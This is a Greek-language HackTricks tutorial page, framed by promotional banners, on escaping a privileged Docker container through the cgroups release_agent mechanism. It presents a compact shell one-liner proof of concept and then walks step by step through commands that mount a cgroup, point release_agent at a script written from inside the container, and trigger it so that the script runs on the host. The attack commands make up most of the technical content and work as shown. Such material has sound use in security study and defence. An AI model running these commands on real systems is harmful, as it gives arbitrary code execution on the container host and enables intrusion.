# Διαφυγή από cgroups με το Docker release_agent

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλου λογισμικού**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αναλήψεων λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλο λογισμικό που κλέβει πληροφορίες.

Μπορείτε να ελέγξετε την ιστοσελίδα τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

---

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην [αρχική ανάρτηση στο blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Αυτό είναι απλώς ένα σύνοψη:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Η απόδειξη του concept (PoC) δείχνει έναν τρόπο εκμετάλλευσης των cgroups με τη δημιουργία ενός αρχείου `release_agent` και την ενεργοποίηση της κλήσης του για να εκτελέσει αυθαίρετες εντολές στον υπολογιστή-φιλοξενούμενο του container. Εδώ υπάρχει μια ανάλυση των βημάτων που εμπλέκονται:

1. **Προετοιμασία του Περιβάλλοντος:**
- Δημιουργείται ένας κατάλογος `/tmp/cgrp` για να λειτουργήσει ως σημείο προσάρτησης για το cgroup.
- Ο ελεγκτής cgroup RDMA προσαρτάται σε αυτόν τον κατάλογο. Σε περίπτωση απουσίας του ελεγκτή RDMA, προτείνεται η χρήση του ελεγκτή cgroup `memory` ως εναλλακτική λύση.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Δημιουργία του Παιδικού Cgroup:**
   - Δημιουργείται ένα παιδικό cgroup με το όνομα "x" εντός του καταλόγου cgroup που έχει τοποθετηθεί.
   - Ενεργοποιούνται οι ειδοποιήσεις για το cgroup "x" γράφοντας τον αριθμό 1 στο αρχείο notify_on_release του.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Διαμόρφωση του Παράγοντα Απελευθέρωσης:**
   - Η διαδρομή του container στον host λαμβάνεται από το αρχείο /etc/mtab.
   - Στη συνέχεια, το αρχείο release_agent του cgroup διαμορφώνεται ώστε να εκτελέσει ένα σενάριο με το όνομα /cmd που βρίσκεται στην αποκτηθείσα διαδρομή του host.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Δημιουργία και Ρύθμιση του Σεναρίου /cmd:**
   - Το σενάριο /cmd δημιουργείται μέσα στο container και ρυθμίζεται να εκτελεί την εντολή ps aux, μεταφέροντας την έξοδο σε ένα αρχείο με όνομα /output στο container. Καθορίζεται ο πλήρης διαδρομής του /output στον host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Εκκίνηση της Επίθεσης:**
   - Ένας διεργασία ξεκινάει εντός του παιδικού cgroup "x" και τερματίζεται αμέσως.
   - Αυτό ενεργοποιεί το `release_agent` (το σενάριο /cmd), το οποίο εκτελεί την εντολή ps aux στον κεντρικό υπολογιστή και γράφει την έξοδο στο /output μέσα στο container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι ένας μηχανισμός αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλων λογισμικών**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αποκλεισμών λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλα λογισμικά που κλέβουν πληροφορίες.

Μπορείτε να ελέγξετε την ιστοσελίδα τους και να δοκιμάσετε τον μηχανισμό τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
